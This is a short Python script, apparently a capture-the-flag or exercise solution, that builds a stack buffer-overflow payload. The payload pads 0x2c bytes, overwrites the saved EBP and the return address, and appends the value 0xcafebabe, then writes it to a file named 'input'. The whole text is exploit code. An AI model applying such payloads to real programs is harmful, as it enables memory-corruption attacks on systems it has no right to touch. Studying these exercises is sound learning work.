
#overide all the things 
payload = b"a" * 0x2c
#overide ebp
payload +=b"b" * 4
#overide return address
payload += b"c" * 4

payload += (0xcafebabe).to_bytes(4,"little")
payload += b"\n"
with open("input", "wb") as output_file:
    output_file.write(payload)
